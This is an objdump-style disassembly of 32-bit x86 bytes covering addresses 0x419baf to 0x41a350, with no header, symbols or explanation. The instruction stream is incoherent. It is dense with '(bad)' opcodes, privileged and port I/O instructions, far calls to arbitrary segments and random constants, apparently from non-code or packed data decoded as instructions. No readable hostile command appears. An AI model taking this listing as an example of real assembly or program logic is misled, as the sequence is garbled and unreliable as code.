  419baf:	stc    
  419bb0:	(bad)  
  419bb1:	nop
  419bb2:	div    BYTE PTR [edi+edx*8-0x61]
  419bb6:	ins    BYTE PTR es:[edi],dx
  419bb7:	leave  
  419bb8:	mov    esi,0x906db427
  419bbd:	pop    ebx
  419bbe:	xchg   cl,cl
  419bc0:	scas   al,BYTE PTR es:[di]
  419bc2:	mov    BYTE PTR [esi],bh
  419bc4:	push   esp
  419bc5:	mov    ch,0x17
  419bc7:	and    dh,BYTE PTR [ebp+0x124c89c6]
  419bcd:	data16 hlt 
  419bcf:	pop    edi
  419bd0:	pop    ebp
  419bd1:	push   cs
  419bd2:	imul   ebp,DWORD PTR [ebx-0x3cc0416d],0xb7a889eb
  419bdc:	je     0x419bbf
  419bde:	adc    eax,0x5179a830
  419be3:	fucomp st(3)
  419be5:	push   ss
  419be6:	gs ja  0x419c1b
  419be9:	xlat   BYTE PTR ds:[ebx]
  419bea:	outs   dx,BYTE PTR ds:[esi]
  419beb:	in     eax,dx
  419bec:	xchg   DWORD PTR [eax-0x4d],ecx
  419bef:	mov    ds:0xbe2cc3f9,eax
  419bf4:	mov    eax,0x603bfbca
  419bf9:	and    bh,dl
  419bfb:	ja     0x419b9e
  419bfd:	mov    eax,0xb04cc9bc
  419c02:	mov    ah,0x1a
  419c04:	div    BYTE PTR [eax+0x5f10a902]
  419c0a:	dec    ecx
  419c0b:	adc    ch,cl
  419c0d:	daa    
  419c0e:	in     eax,dx
  419c0f:	pusha  
  419c10:	adc    dl,dh
  419c12:	scas   al,BYTE PTR es:[edi]
  419c13:	mov    ch,0xcd
  419c15:	pop    ebp
  419c16:	loope  0x419bdf
  419c18:	mov    ecx,0x4af969d8
  419c1d:	adc    esi,esi
  419c1f:	call   0xeeebe896
  419c24:	jns    0x419c07
  419c26:	pop    ebp
  419c27:	add    al,0x78
  419c29:	fwait
  419c2a:	cmp    DWORD PTR [ebp+0x52],edx
  419c2d:	sub    BYTE PTR [esi],dl
  419c2f:	dec    edi
  419c30:	js     0x419be5
  419c32:	rcl    bl,cl
  419c34:	xor    eax,0x9bc03598
  419c39:	push   ecx
  419c3a:	cmp    eax,0x4b353fe4
  419c3f:	push   0xf4fe399d
  419c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c45:	scas   eax,DWORD PTR es:[edi]
  419c46:	xor    DWORD PTR [ebx-0x15871259],ebp
  419c4c:	sbb    al,0x36
  419c4e:	fs int 0xa4
  419c51:	pop    edx
  419c52:	shl    BYTE PTR [eax-0x1e],cl
  419c55:	js     0x419ccb
  419c57:	and    bh,al
  419c59:	adc    DWORD PTR [edi-0x24],esi
  419c5c:	neg    DWORD PTR [edi-0x693e64fc]
  419c62:	das    
  419c63:	jae    0x419cae
  419c65:	test   eax,0xdbadcc1c
  419c6a:	into   
  419c6b:	in     al,0x67
  419c6d:	gs arpl bp,si
  419c70:	nop
  419c71:	idiv   edi
  419c73:	or     DWORD PTR [esi+0x30],0x44
  419c77:	call   0x4c:0xc8d50786
  419c7e:	mov    BYTE PTR [edx+edi*4-0x33b0f317],ch
  419c85:	fiadd  DWORD PTR [ecx+0x30b19a8c]
  419c8b:	pop    eax
  419c8c:	out    dx,al
  419c8d:	mov    BYTE PTR [ebp+0x3c],dh
  419c90:	add    BYTE PTR [edx],bl
  419c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c93:	mov    ecx,0x82b2ea49
  419c98:	fwait
  419c99:	mov    ds:0x4b58fd17,eax
  419c9e:	add    eax,0x2b3f4636
  419ca3:	or     dl,0xe3
  419ca6:	lods   eax,DWORD PTR ds:[esi]
  419ca7:	sar    BYTE PTR [edx+0x1a6fb94f],0xae
  419cae:	int3   
  419caf:	popf   
  419cb0:	pusha  
  419cb1:	test   al,0x74
  419cb3:	rcr    BYTE PTR [eax-0x69],1
  419cb6:	bound  ecx,QWORD PTR [ebp+0x11]
  419cb9:	mov    eax,0x4f5afaa4
  419cbe:	sahf   
  419cbf:	adc    eax,0x7a1941e9
  419cc4:	xor    BYTE PTR [eax],ch
  419cc6:	call   0xe3ac38c3
  419ccb:	mov    ebp,0xda235638
  419cd0:	clc    
  419cd1:	loope  0x419c9e
  419cd3:	xlat   BYTE PTR ds:[ebx]
  419cd4:	test   al,0x74
  419cd6:	loopne 0x419c6d
  419cd8:	push   0x2212ec1f
  419cdd:	push   esi
  419cde:	dec    edx
  419cdf:	data16 mov al,ds:0x672b95da
  419ce5:	stc    
  419ce6:	rcl    DWORD PTR [ebp+0x38],0x57
  419cea:	ret    
  419ceb:	retf   0x8dd1
  419cee:	mov    bl,0x46
  419cf0:	inc    edi
  419cf1:	push   edi
  419cf2:	bound  ecx,QWORD PTR es:[ebp-0x79cdeb5d]
  419cf9:	in     eax,dx
  419cfa:	ret    
  419cfb:	js     0x419c9a
  419cfd:	test   al,0x3c
  419cff:	inc    eax
  419d00:	pop    ds
  419d01:	sbb    ch,BYTE PTR [eax]
  419d03:	lea    esp,[edx-0x2f20920a]
  419d09:	cdq    
  419d0a:	xchg   ebp,eax
  419d0b:	out    dx,eax
  419d0c:	out    0x2e,eax
  419d0e:	mov    eax,0x8279050c
  419d13:	mov    dl,0x76
  419d15:	inc    edx
  419d16:	xchg   edi,eax
  419d17:	and    BYTE PTR [edx],0x69
  419d1a:	push   ss
  419d1b:	popf   
  419d1c:	mov    esi,0xc44b0125
  419d21:	dec    esp
  419d22:	ins    DWORD PTR es:[edi],dx
  419d23:	stos   BYTE PTR es:[edi],al
  419d24:	inc    eax
  419d25:	dec    esi
  419d26:	push   0x4ec3cc87
  419d2b:	rol    DWORD PTR [edx-0x16],cl
  419d2e:	repz (bad) 
  419d30:	fadd   DWORD PTR [ebp+0x1e]
  419d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d34:	xchg   BYTE PTR [edi+0xcf7c1a5],ah
  419d3a:	jg     0x419d85
  419d3c:	add    BYTE PTR [edx+ebx*8+0xed9113e],cl
  419d43:	mov    ds:0x9657e12c,al
  419d48:	mov    edx,0x341e681f
  419d4d:	sti    
  419d4e:	mov    es,WORD PTR [ebx+ebp*2+0x25d6b5b]
  419d55:	or     ch,BYTE PTR [ebp-0x414f32b1]
  419d5b:	out    dx,al
  419d5c:	cdq    
  419d5d:	aam    0x91
  419d5f:	test   BYTE PTR [ebp+0x16be32b9],bh
  419d65:	cmp    al,0xe0
  419d67:	fcomip st,st(0)
  419d69:	adc    ebp,DWORD PTR [edi]
  419d6b:	add    ecx,ebx
  419d6d:	lods   al,BYTE PTR ds:[esi]
  419d6e:	stc    
  419d6f:	(bad)
  419d73:	add    eax,0x5bc1973
  419d78:	int    0xf6
  419d7a:	pop    ebp
  419d7b:	hlt    
  419d7c:	aas    
  419d7d:	pop    ss
  419d7e:	ins    DWORD PTR es:[edi],dx
  419d7f:	sbb    al,0x73
  419d81:	mov    bl,0x73
  419d83:	fsubr  QWORD PTR [esi*1+0x2f48f1b1]
  419d8a:	les    ecx,FWORD PTR [edx+0x38]
  419d8d:	add    ebx,DWORD PTR [ecx-0x5f8703eb]
  419d93:	nop
  419d94:	mov    cl,0x92
  419d96:	cld    
  419d97:	shr    ah,cl
  419d99:	mov    edx,0x81d72731
  419d9e:	jmp    0x1d6fcba3
  419da3:	jle    0x419e07
  419da5:	lds    esi,FWORD PTR [ebp-0x2b693141]
  419dab:	sub    al,0x24
  419dad:	ds mov bh,0xfd
  419db0:	gs add eax,0xd7a33db2
  419db6:	pusha  
  419db7:	or     al,0xe0
  419db9:	ror    DWORD PTR [ecx+0x10],cl
  419dbc:	or     edi,DWORD PTR [esi]
  419dbe:	push   cs
  419dbf:	cmp    ch,cl
  419dc1:	test   eax,0xf3e10342
  419dc6:	scas   eax,DWORD PTR es:[edi]
  419dc7:	rcr    BYTE PTR [eax+0x42],cl
  419dca:	cmp    esp,DWORD PTR [edx-0x7713817f]
  419dd0:	push   cs
  419dd1:	mov    ch,0x8d
  419dd3:	xor    al,0x6
  419dd5:	cmp    BYTE PTR ds:0xf348ee3a,cl
  419ddb:	bound  edi,QWORD PTR [eax-0x2e]
  419dde:	ins    BYTE PTR es:[edi],dx
  419ddf:	in     eax,0x6
  419de1:	dec    edi
  419de2:	jbe    0x419d94
  419de4:	icebp  
  419de5:	(bad)  
  419de6:	xor    cl,al
  419de8:	mov    edi,0x69c8430c
  419ded:	push   0x251b1616
  419df2:	push   ds
  419df3:	sub    ah,BYTE PTR [edi-0x5]
  419df6:	mov    ebp,0xb90f2523
  419dfb:	pop    ss
  419dfc:	dec    BYTE PTR [eax]
  419dfe:	or     al,0x9a
  419e00:	mov    bh,0x1d
  419e02:	sbb    esp,DWORD PTR [edi-0x4c]
  419e05:	xor    ecx,DWORD PTR [edx-0x30]
  419e08:	pop    ebp
  419e09:	test   BYTE PTR [esi],al
  419e0b:	mov    dl,0x9f
  419e0d:	xchg   esi,eax
  419e0e:	jmp    0xef50:0xe4d97193
  419e15:	jb     0x419da4
  419e17:	out    0x23,al
  419e19:	add    DWORD PTR [ebp+0x9e08e3c],eax
  419e1f:	(bad)  
  419e20:	rol    DWORD PTR [ecx],cl
  419e22:	les    ecx,FWORD PTR [eax+0x13adc77d]
  419e28:	jbe    0x419dcd
  419e2a:	xor    BYTE PTR [edx+0x18c664ec],cl
  419e30:	fdiv   QWORD PTR [eax]
  419e32:	pushf  
  419e33:	lods   al,BYTE PTR ds:[esi]
  419e34:	push   edx
  419e35:	xor    al,0x5c
  419e37:	or     DWORD PTR [edi+edi*2+0x21],ebx
  419e3b:	push   edx
  419e3c:	sbb    BYTE PTR es:[esi],ah
  419e3f:	jbe    0x419e07
  419e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e42:	jae    0x419e21
  419e44:	les    esi,FWORD PTR [esi+0x7ceb9a62]
  419e4a:	adc    edi,ecx
  419e4c:	pop    edi
  419e4d:	push   esi
  419e4e:	inc    ebx
  419e4f:	pop    eax
  419e50:	jle    0x419e1e
  419e52:	outs   dx,BYTE PTR ds:[esi]
  419e53:	mov    BYTE PTR [esi-0x68],ch
  419e56:	sbb    DWORD PTR [ebp+0x2c],0xffffffc9
  419e5a:	mov    edi,0x52fea6bd
  419e5f:	xor    eax,0x789b1239
  419e64:	leave  
  419e65:	loope  0x419e8a
  419e67:	mov    esp,0xc1e444c2
  419e6c:	icebp  
  419e6d:	rsm    
  419e6f:	in     eax,0x58
  419e71:	ins    BYTE PTR es:[edi],dx
  419e72:	sar    DWORD PTR [edx-0x35],0xcb
  419e76:	cld    
  419e77:	push   es
  419e78:	pop    ecx
  419e79:	xchg   DWORD PTR [edi+0x28],ebp
  419e7c:	jle    0x419e00
  419e7e:	cmp    al,0x40
  419e80:	xchg   ebx,eax
  419e81:	jle    0x419e19
  419e83:	pop    ss
  419e84:	stos   DWORD PTR es:[edi],eax
  419e85:	out    0x1,al
  419e87:	push   0x42dd11bc
  419e8c:	jmp    0x66dae444
  419e91:	nop
  419e92:	daa    
  419e93:	jbe    0x419ecf
  419e95:	pop    edi
  419e96:	shr    DWORD PTR [ecx+0x34],cl
  419e99:	mov    esp,0x5f454a68
  419e9e:	mov    eax,0xc1e0e401
  419ea3:	add    eax,DWORD PTR [ebx+0x441c16f6]
  419ea9:	add    al,0x88
  419eab:	in     al,0xec
  419ead:	call   DWORD PTR [edx]
  419eaf:	xor    eax,0x5853d20e
  419eb4:	shl    dh,cl
  419eb6:	test   al,0x71
  419eb8:	scas   al,BYTE PTR es:[edi]
  419eb9:	std    
  419eba:	dec    ebp
  419ebb:	mov    al,ch
  419ebd:	jle    0x419e45
  419ebf:	sahf   
  419ec0:	and    ah,BYTE PTR [eax-0xc]
  419ec3:	fwait
  419ec4:	int    0x41
  419ec6:	cmc    
  419ec7:	mov    ebx,0xd4525605
  419ecc:	and    DWORD PTR [ecx+0x2],ebx
  419ecf:	dec    eax
  419ed0:	js     0x419f3c
  419ed2:	out    0xc0,al
  419ed4:	clc    
  419ed5:	cs jno 0x419f08
  419ed8:	int3   
  419ed9:	(bad)  
  419eda:	fcomp  DWORD PTR [edi+0x79]
  419edd:	repnz imul esi,DWORD PTR [edi],0xb38aff58
  419ee4:	sar    DWORD PTR [edi],1
  419ee6:	fs loopne 0x419f3a
  419ee9:	xor    esi,DWORD PTR [esi-0x20]
  419eec:	add    DWORD PTR [ecx-0x7d],0x24d07daa
  419ef3:	mov    esi,esi
  419ef5:	xchg   ebx,eax
  419ef6:	(bad)  
  419ef7:	dec    ebx
  419ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef9:	jmp    0x419ec2
  419efb:	sbb    BYTE PTR [eax-0x5628b0b4],ch
  419f01:	inc    ecx
  419f02:	jge    0x419ec6
  419f04:	fldenv [edx+0x6b]
  419f07:	stc    
  419f08:	aad    0x4
  419f0a:	push   ecx
  419f0b:	xor    DWORD PTR [edi],edi
  419f0d:	cmp    BYTE PTR [edi],0x2d
  419f10:	test   BYTE PTR [ebx+0x20],dh
  419f13:	mov    al,ds:0x3980619c
  419f18:	sbb    ebx,DWORD PTR [edx-0x72c2e1e5]
  419f1e:	shr    DWORD PTR [ecx],0x94
  419f21:	jno    0x419f19
  419f23:	mov    BYTE PTR [edi-0x60834ed4],0x26
  419f2a:	das    
  419f2b:	push   ebp
  419f2c:	xor    eax,0x1d7813ab
  419f31:	dec    esp
  419f32:	pop    edx
  419f33:	xor    eax,0x7982789a
  419f38:	dec    ecx
  419f39:	sbb    ecx,DWORD PTR [edx-0x6f]
  419f3c:	cmp    ebx,0xe7bc7ad0
  419f42:	loopne 0x419f09
  419f44:	pushf  
  419f45:	repnz into 
  419f47:	dec    ebp
  419f48:	fist   DWORD PTR [ebx-0x33]
  419f4b:	call   0xf2f2:0xf8d6c90b
  419f52:	jle    0x419eff
  419f54:	in     eax,dx
  419f55:	sahf   
  419f56:	rcr    DWORD PTR [eax+0x5f],cl
  419f59:	fistp  DWORD PTR [edx+edi*8-0x58c3f20b]
  419f60:	dec    eax
  419f61:	in     eax,0x5c
  419f63:	(bad)  
  419f64:	adc    DWORD PTR ds:0x2dd781a1,ebp
  419f6a:	popa   
  419f6b:	and    edx,ebp
  419f6d:	out    dx,eax
  419f6e:	jnp    0x419fc3
  419f70:	mov    bl,0x75
  419f72:	int    0x6
  419f74:	int3   
  419f75:	dec    ecx
  419f76:	sub    esi,DWORD PTR [edi+0x1b3cce9e]
  419f7c:	and    al,0x3e
  419f7f:	mov    ch,0x97
  419f81:	call   FWORD PTR [ecx]
  419f83:	cmp    DWORD PTR [eax],esi
  419f85:	ins    BYTE PTR es:[edi],dx
  419f86:	outs   dx,DWORD PTR ds:[esi]
  419f87:	sbb    eax,0xb33b287f
  419f8c:	jnp    0x41a003
  419f8e:	fstp   DWORD PTR [edx]
  419f90:	popa   
  419f91:	mov    WORD PTR [ebp+0xb],fs
  419f94:	lods   eax,DWORD PTR ds:[esi]
  419f95:	fisub  WORD PTR [eax-0x3d]
  419f98:	clc    
  419f99:	daa    
  419f9a:	sub    al,bh
  419f9c:	imul   esp,DWORD PTR [ebp-0x7b4dd94],0xffffff90
  419fa3:	add    eax,0xd0da3385
  419fa8:	mov    esp,0xcbaa19d7
  419fad:	and    cl,BYTE PTR [edx+edx*2+0x28]
  419fb1:	adc    al,0xb5
  419fb3:	fadd   DWORD PTR [edx+0x6fa98a6f]
  419fb9:	xchg   BYTE PTR gs:[edx-0x3f],dl
  419fbd:	add    DWORD PTR [esp+eax*2],edi
  419fc0:	scas   eax,DWORD PTR es:[edi]
  419fc1:	call   0xfb23:0x4a63bd75
  419fc8:	leave  
  419fc9:	int3   
  419fca:	js     0x41a03d
  419fcc:	or     dl,dh
  419fce:	push   es
  419fcf:	or     ecx,eax
  419fd1:	pusha  
  419fd2:	leave  
  419fd3:	add    eax,eax
  419fd5:	sub    eax,0x346820f2
  419fda:	mov    ebp,0x883a53bc
  419fdf:	push   cs
  419fe0:	cmp    bh,bh
  419fe2:	test   al,0x80
  419fe4:	(bad)  
  419fe5:	dec    eax
  419fe6:	jmp    0x27b0:0x56f0da76
  419fed:	or     al,0x8c
  419fef:	push   eax
  419ff0:	sysret 
  419ff2:	pop    ebp
  419ff3:	mov    ds:0xbac9f28b,eax
  419ff8:	mov    ds:0xa815c588,al
  419ffd:	test   DWORD PTR [esi-0x2],0x6a03f039
  41a004:	mov    esp,0xd569cb84
  41a009:	icebp  
  41a00a:	push   esp
  41a00b:	sbb    eax,0xa80896ae
  41a010:	xchg   ebp,eax
  41a011:	xchg   ebp,eax
  41a012:	inc    ecx
  41a013:	and    eax,0x8a562d6a
  41a018:	or     ah,bh
  41a01a:	pop    esi
  41a01b:	(bad)  
  41a01c:	cli    
  41a01d:	aad    0x91
  41a01f:	sub    BYTE PTR [ecx+eax*4-0x1e9ec9df],dl
  41a026:	rep stos BYTE PTR es:[edi],al
  41a028:	stos   DWORD PTR es:[edi],eax
  41a029:	inc    esp
  41a02a:	adc    DWORD PTR [ebx+ebp*4+0x54],edi
  41a02e:	push   ss
  41a02f:	scas   al,BYTE PTR es:[edi]
  41a030:	in     eax,0xd6
  41a032:	xchg   BYTE PTR [ebx],dl
  41a034:	add    DWORD PTR [ebx-0x6e],esi
  41a037:	mov    dl,0x6e
  41a039:	jecxz  0x41a065
  41a03b:	sahf   
  41a03c:	mov    ecx,DWORD PTR [eax]
  41a03e:	idiv   BYTE PTR [edx+0x6fe0a6ce]
  41a044:	add    eax,DWORD PTR [eax]
  41a046:	mov    WORD PTR [ebx+0xd],?
  41a049:	aad    0x0
  41a04b:	push   0xe
  41a04d:	push   ecx
  41a04e:	scas   al,BYTE PTR es:[edi]
  41a04f:	out    0xaa,eax
  41a051:	les    ecx,FWORD PTR [eax]
  41a053:	hlt    
  41a054:	mov    ds:0x17a157fe,eax
  41a059:	jecxz  0x419ff1
  41a05b:	jp     0x419ffc
  41a05d:	call   0x7634ceaf
  41a062:	push   0xdf86eb2a
  41a067:	xor    al,0x75
  41a069:	int    0xc7
  41a06b:	add    DWORD PTR [ebx-0x239cbea7],esi
  41a071:	pushf  
  41a072:	mov    ecx,0x4ab2bb38
  41a077:	cli    
  41a078:	test   BYTE PTR [ebx-0x45f5b705],bh
  41a07e:	call   0xaa5:0x97ec1341
  41a085:	adc    ch,BYTE PTR [edi+0x153b1314]
  41a08b:	or     edx,edi
  41a08d:	fs repz fld DWORD PTR fs:[eax]
  41a092:	ja     0x41a0e4
  41a094:	fs add bh,dl
  41a097:	mov    dl,0x93
  41a099:	sub    al,0x96
  41a09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a09c:	mov    edx,0xd7ee6c14
  41a0a1:	repnz lods al,BYTE PTR ds:[esi]
  41a0a3:	jbe    0x41a04c
  41a0a5:	cmp    edi,DWORD PTR [edx]
  41a0a7:	std    
  41a0a8:	inc    ecx
  41a0a9:	cmp    edx,edx
  41a0ab:	in     eax,0x23
  41a0ad:	daa    
  41a0ae:	pop    ebx
  41a0af:	mov    edx,edi
  41a0b1:	shl    DWORD PTR [edi+0x204d88b6],cl
  41a0b7:	mov    ch,0x68
  41a0b9:	dec    ebp
  41a0ba:	and    al,BYTE PTR [edx]
  41a0bc:	xor    al,0x4f
  41a0be:	or     dl,al
  41a0c0:	rcr    ch,1
  41a0c2:	push   ss
  41a0c3:	call   0x4e65c2e5
  41a0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c9:	cmp    eax,0xd23a0fd1
  41a0ce:	aad    0x42
  41a0d0:	sub    ebp,ecx
  41a0d2:	test   al,0x15
  41a0d4:	out    0xc1,al
  41a0d6:	inc    ecx
  41a0d7:	cmp    dh,ch
  41a0d9:	and    DWORD PTR [ebx],ebp
  41a0db:	xchg   ecx,eax
  41a0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0dd:	dec    esi
  41a0de:	sbb    edx,DWORD PTR [edi]
  41a0e0:	mov    esi,ecx
  41a0e2:	xor    al,0x56
  41a0e4:	pop    edi
  41a0e5:	sub    ebp,DWORD PTR [ebp+0xe]
  41a0e8:	test   DWORD PTR [edi],edi
  41a0ea:	retf   0xabb2
  41a0ed:	into   
  41a0ee:	gs in  eax,dx
  41a0f0:	fdiv   QWORD PTR [edi]
  41a0f2:	add    BYTE PTR [edx-0x39],dh
  41a0f5:	loope  0x41a0f1
  41a0f7:	sbb    al,0x4a
  41a0f9:	test   al,0x90
  41a0fb:	jbe    0x41a0f6
  41a0fd:	mov    esi,0x929c77a6
  41a102:	outs   dx,BYTE PTR ds:[esi]
  41a103:	leave  
  41a104:	xchg   esi,eax
  41a105:	xor    ch,dl
  41a107:	or     edx,0xffffffd5
  41a10a:	popa   
  41a10b:	std    
  41a10c:	stos   BYTE PTR es:[edi],al
  41a10d:	mov    dl,0xa
  41a10f:	push   0x18ff1119
  41a114:	push   esi
  41a115:	fsubrp st(1),st
  41a117:	pop    ebp
  41a118:	mov    esp,0xa7cebc6d
  41a11d:	jecxz  0x41a0f8
  41a11f:	frstor [eax-0x25d696c9]
  41a125:	push   cs
  41a126:	call   0xe769f8c2
  41a12b:	ds loope 0x41a190
  41a12e:	mov    ah,0x2d
  41a130:	mov    DWORD PTR [edi+ecx*1+0x28],edx
  41a134:	inc    ecx
  41a135:	xor    DWORD PTR [edx+0x70],edx
  41a138:	pop    esp
  41a139:	gs add al,0x89
  41a13c:	xor    al,0xa5
  41a13e:	or     BYTE PTR [edi+0x67adab6a],bl
  41a144:	nop
  41a145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a146:	sar    BYTE PTR [edi+eax*8],cl
  41a149:	xor    al,BYTE PTR [esi]
  41a14b:	mov    ch,0x8a
  41a14d:	cmp    cl,BYTE PTR [ecx+ecx*1-0x6b]
  41a151:	popf   
  41a152:	jmp    0x41a193
  41a154:	jg     0x41a0e1
  41a156:	aaa    
  41a157:	js     0x41a1c6
  41a159:	inc    esi
  41a15a:	cmp    al,0xaf
  41a15c:	cmp    BYTE PTR [ecx+0x62144b8b],bh
  41a162:	inc    ebp
  41a163:	mov    al,ds:0x12b9ad86
  41a168:	and    al,0xeb
  41a16a:	scas   eax,DWORD PTR es:[edi]
  41a16b:	mov    bh,0x85
  41a16d:	sub    DWORD PTR [esp+eiz*2+0x29cc5693],edx
  41a174:	loopne 0x41a184
  41a176:	inc    ecx
  41a177:	xor    BYTE PTR [edx+0x56c8452c],dh
  41a17d:	into   
  41a17e:	sar    BYTE PTR [esp+ebp*1-0x307466e1],cl
  41a185:	and    ebp,DWORD PTR [eax-0x40fa1ce4]
  41a18b:	popf   
  41a18c:	popa   
  41a18d:	(bad)  
  41a18e:	ror    BYTE PTR [ecx-0x32],1
  41a191:	mov    al,ds:0x2e4cbef8
  41a196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a197:	push   ebx
  41a198:	das    
  41a199:	pop    ebx
  41a19a:	sbb    eax,DWORD PTR [ebx-0x159f529a]
  41a1a0:	sbb    edi,DWORD PTR [ecx-0x6b0764fa]
  41a1a6:	inc    eax
  41a1a7:	leave  
  41a1a8:	loopne 0x41a191
  41a1aa:	jno    0x41a16e
  41a1ac:	inc    edi
  41a1ad:	sti    
  41a1ae:	rol    DWORD PTR [edi],1
  41a1b0:	out    0xdd,al
  41a1b2:	outs   dx,BYTE PTR ds:[esi]
  41a1b3:	ss out 0xb5,eax
  41a1b6:	adc    BYTE PTR [ebx-0x68],ah
  41a1b9:	in     al,dx
  41a1ba:	retf   0x5514
  41a1bd:	gs pop esp
  41a1bf:	stos   DWORD PTR es:[edi],eax
  41a1c0:	addr16 mov eax,ds:0x7f38
  41a1c4:	xor    al,0xf2
  41a1c6:	or     BYTE PTR [eax+edx*2+0x23d21630],bh
  41a1cd:	mov    bh,0x61
  41a1cf:	jmp    0x41a24d
  41a1d1:	push   esp
  41a1d2:	fxch   st(3)
  41a1d4:	adc    esp,ebx
  41a1d6:	cmp    al,ah
  41a1d8:	mov    eax,0xb38c2ae8
  41a1dd:	aaa    
  41a1de:	sub    al,0x92
  41a1e0:	pop    ebp
  41a1e1:	cwde   
  41a1e2:	imul   esi,DWORD PTR [ecx+0x1],0x49fe92e2
  41a1e9:	enter  0x187d,0x25
  41a1ed:	jb     0x41a177
  41a1ef:	push   ecx
  41a1f0:	pusha  
  41a1f1:	sti    
  41a1f2:	fcomp  QWORD PTR [esi+0x2]
  41a1f5:	jmp    0xbaaa:0x8b0bf017
  41a1fc:	repz pop es
  41a1fe:	fild   DWORD PTR [esi]
  41a200:	sbb    BYTE PTR [edi+ebp*2],dl
  41a203:	jmp    0x41a1d1
  41a205:	xchg   edx,eax
  41a206:	in     al,0xaa
  41a208:	mov    edx,0x2f8e4c24
  41a20d:	fnstsw WORD PTR [eax-0x48]
  41a210:	mov    ch,0xef
  41a212:	clc    
  41a213:	xchg   edx,eax
  41a214:	mov    cl,0x6d
  41a216:	cmp    ebx,DWORD PTR [ebp+esi*2+0x35]
  41a21a:	jns    0x41a1b8
  41a21c:	call   0xcb21:0x25086022
  41a223:	outs   dx,DWORD PTR ds:[esi]
  41a224:	jns    0x41a2a0
  41a226:	adc    al,0xf0
  41a228:	out    dx,eax
  41a229:	mov    ah,bl
  41a22b:	push   ds
  41a22c:	xor    al,ch
  41a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a22f:	idiv   edi
  41a231:	repnz cmp DWORD PTR ds:0x251356b5,eax
  41a238:	xchg   ebp,eax
  41a239:	lds    eax,FWORD PTR [edi-0x3d]
  41a23c:	add    DWORD PTR es:[ecx-0x3],edx
  41a240:	pop    esi
  41a241:	xchg   DWORD PTR [esi+0x3f],ebp
  41a244:	cmp    ch,BYTE PTR [edi]
  41a246:	jae    0x41a2b1
  41a248:	lock cmp DWORD PTR [eax+0x2e1e13c6],edx
  41a24f:	mov    bl,0x1f
  41a251:	addr16 mov ds:0x3dc7,eax
  41a255:	pop    edx
  41a256:	sub    eax,0xf524a6b7
  41a25b:	fwait
  41a25c:	loop   0x41a21e
  41a25e:	inc    eax
  41a25f:	sub    ecx,DWORD PTR [esi-0x146edf8a]
  41a265:	jge    0x41a269
  41a267:	push   0x1989785f
  41a26c:	popa   
  41a26d:	cmp    DWORD PTR [ecx],ebp
  41a26f:	ds cmp ax,0xe335
  41a274:	cdq    
  41a275:	or     DWORD PTR [ecx+0x703a7dac],esi
  41a27b:	or     edx,esi
  41a27d:	fdivr  st,st(3)
  41a27f:	scas   al,BYTE PTR es:[edi]
  41a280:	jno    0x41a262
  41a282:	sub    bh,al
  41a284:	call   0xbec2:0xaff5031a
  41a28b:	cmp    al,0x42
  41a28d:	mov    ds:0xd891c744,eax
  41a292:	add    ebx,ebp
  41a294:	repnz in eax,dx
  41a296:	aaa    
  41a297:	ds xor dl,ch
  41a29a:	mov    BYTE PTR [ebp+0xa],dh
  41a29d:	mov    ecx,0xd35796b9
  41a2a2:	and    al,0x6e
  41a2a4:	mov    ds:0x200942d9,eax
  41a2a9:	push   esp
  41a2aa:	jp     0x41a2a2
  41a2ac:	call   0x4d66:0x3f9d83b6
  41a2b3:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b5:	add    BYTE PTR [esp+edx*8-0x367769ef],bl
  41a2bc:	jbe    0x41a285
  41a2be:	xlat   BYTE PTR ds:[ebx]
  41a2bf:	iret   
  41a2c0:	mov    bl,0x20
  41a2c2:	push   ss
  41a2c3:	mov    al,0x47
  41a2c5:	outs   dx,DWORD PTR ds:[esi]
  41a2c6:	loopne 0x41a2b3
  41a2c8:	pop    esi
  41a2c9:	outs   dx,DWORD PTR ds:[esi]
  41a2ca:	call   0xa5ae:0x7653c9d3
  41a2d1:	dec    esp
  41a2d2:	push   esp
  41a2d3:	lods   eax,DWORD PTR ds:[esi]
  41a2d4:	jno    0x41a260
  41a2d6:	scas   al,BYTE PTR es:[edi]
  41a2d7:	sub    DWORD PTR [edx+0x59],eax
  41a2da:	cli    
  41a2db:	add    DWORD PTR [edx+0xcc8e539],ebp
  41a2e1:	inc    edi
  41a2e2:	and    eax,0xe16cc6a9
  41a2e7:	lahf   
  41a2e8:	out    dx,al
  41a2e9:	and    ebp,esp
  41a2eb:	push   ds
  41a2ec:	inc    ecx
  41a2ed:	inc    ecx
  41a2ee:	das    
  41a2ef:	bound  eax,QWORD PTR [si]
  41a2f2:	fmul   st,st(1)
  41a2f4:	mov    ch,0xea
  41a2f6:	push   ds
  41a2f7:	call   0x3912:0x41a628da
  41a2fe:	inc    edx
  41a2ff:	lock mov eax,0xfc9b885e
  41a305:	ret    0xc419
  41a308:	add    BYTE PTR [si+0x7a],dl
  41a30c:	(bad)  
  41a30e:	(bad)  
  41a30f:	xor    eax,0x99aa12f6
  41a314:	retf   
  41a315:	call   0x2173c1ea
  41a31a:	xlat   BYTE PTR ds:[ebx]
  41a31b:	shl    esp,0x10
  41a31e:	sub    esp,eax
  41a320:	push   edi
  41a321:	bound  esp,QWORD PTR [ebp-0x2d]
  41a324:	jge    0x41a385
  41a326:	mov    edx,0x69151a29
  41a32b:	test   BYTE PTR [esi-0x7f],bl
  41a32e:	mov    ah,0xea
  41a330:	fisttp QWORD PTR [eax+0x4b9257a4]
  41a336:	aas    
  41a337:	inc    ecx
  41a338:	out    0x76,eax
  41a33a:	cmc    
  41a33b:	xchg   esp,eax
  41a33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a33d:	adc    al,0x43
  41a33f:	pop    ss
  41a340:	fnstenv [ebx+0x3b]
  41a343:	es xchg edi,eax
  41a345:	and    eax,0xdbf08cc9
  41a34a:	ficomp WORD PTR [eax+0x4e99b622]
  41a350:	sub    DWORD PTR [ebp+0x6b],ebx
